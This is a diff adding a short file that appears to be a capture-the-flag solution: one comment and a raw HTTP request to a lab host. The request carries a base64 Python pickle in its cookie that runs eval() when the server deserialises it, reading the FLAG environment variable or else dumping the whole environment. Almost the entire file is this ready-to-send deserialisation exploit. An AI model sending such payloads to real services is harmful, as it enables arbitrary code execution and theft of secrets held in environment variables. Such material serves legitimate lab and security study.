@@ -1,0 +1,5 @@
+# Malicious pickle cookie that calls eval() at deserialization time to read os.environ['FLAG']. The UrlObj list is reflected in the response HTML, revealing flag{1b99d3aa-9a73-43c0-8429-6ccc06a702e0}
+
+GET /list HTTP/1.1
+Host: 172.17.0.1:39075
+Cookie: user=6b82058111b543cd85d01e62aa4b30e2; bookmarks=gASVpgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIyKW3R5cGUoJ1VybE9iaicsICgpLCB7J25hbWUnOiAnRkxBRycsICd1cmwnOiBfX2ltcG9ydF9fKCdvcycpLmVudmlyb24uZ2V0KCdGTEFHJywgc3RyKGRpY3QoX19pbXBvcnRfXygnb3MnKS5lbnZpcm9uKSkpfSkoKV0gaWYgVHJ1ZSBlbHNlIFtdlIWUUpQu
